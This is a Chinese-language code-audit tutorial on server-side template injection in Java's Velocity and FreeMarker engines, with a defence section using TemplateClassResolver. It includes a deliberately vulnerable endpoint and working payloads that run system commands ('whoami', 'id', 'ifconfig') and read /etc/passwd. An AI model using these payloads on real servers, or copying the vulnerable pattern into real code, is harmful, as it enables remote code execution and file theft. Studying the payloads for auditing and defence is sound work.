# java代码审计-ssti

## 0x01漏洞挖掘

### Velocity

```java
@RequestMapping("/ssti/velocity")
public String velocity(@RequestParam(name = "content") String content) {
    Velocity.init();
    VelocityContext velocityContext = new VelocityContext();

    velocityContext.put("username", "seaii");

    StringWriter stringWriter = new StringWriter();
    Velocity.evaluate(velocityContext, stringWriter, "test", content);
    return stringWriter.toString();
}
```

利用方式：

```
#set ($exp = "exp");$exp.getClass().forName("java.lang.Runtime").getRuntime().exec("whoami")
```

### FreeMarker

```java
@RequestMapping("/ssti/freemarker")
public String freemarker() throws IOException, TemplateException {
    Configuration configuration = new Configuration(Configuration.VERSION_2_3_23);
    configuration.setClassForTemplateLoading(this.getClass(), "/templates");
    Template template = configuration.getTemplate("test.ftl");

    Map<String, Object> rootMap = new HashMap<String, Object>();
    rootMap.put("username", "passwd");
    StringWriter stringWriter = new StringWriter();
    template.process(rootMap, stringWriter);
    return stringWriter.toString();
}
```

freemarker与velocity的攻击方式不太一样，freemarker可利用的点在于模版语法本身，直接渲染用户输入payload会被转码而失效，所以一般的利用场景为上传或者修改模版文件。

利用方式如下：

命令执行1：

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

命令执行2：

```java
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()> 
<#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",ob("java.lang.ProcessBuilder","ifconfig").start().getInputStream())) >        


<#list 1..10000 as t>
    <#assign line=br.readLine()!"null">
    <#if line=="null">
        <#break>
    </#if>
    ${line}
    ${"<br>"}
</#list>
```

文件读取：

```java
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()> 
<#assign br=ob("java.io.BufferedReader",ob("java.io.InputStreamReader",ob("java.io.FileInputStream","/etc/passwd"))) >        


<#list 1..10000 as t>
    <#assign line=br.readLine()!"null">
    <#if line=="null">
        <#break>
    </#if>
    ${line?html}
    ${"<br>"}
</#list>
```

将上面的payload写入到模版文件保存，然后让freemarker加载即可。

## 0x02漏洞防御

### Velocity

velocity到目前最新版本也没有提供沙盒或者防御方式，只能禁止或严格过滤用户输入进入**Velocity.evaluate**。

### FreeMarker

最简单的方式是使用**TemplateClassResolver**，文档在这：

[https://freemarker.apache.org/docs/api/freemarker/core/TemplateClassResolver.html](https://freemarker.apache.org/docs/api/freemarker/core/TemplateClassResolver.html)

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191210230921.png)

可根据实际需求选择这两种方式，代码实现如下：

```java
configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
```

但这并不是一劳永逸的防御方式，如果配置不当，依然会造成安全问题：

[Freemarker模板注入 Bypass](https://xz.aliyun.com/t/4846)

## 0x03参考链接

[服务端模板注入：现代WEB远程代码执行（补充翻译和扩展）](https://wooyun.js.org/drops/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%9A%E7%8E%B0%E4%BB%A3WEB%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88%E8%A1%A5%E5%85%85%E7%BF%BB%E8%AF%91%E5%92%8C%E6%89%A9%E5%B1%95%EF%BC%89.html)

[https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)

[Freemarker模板注入 Bypass](https://xz.aliyun.com/t/4846)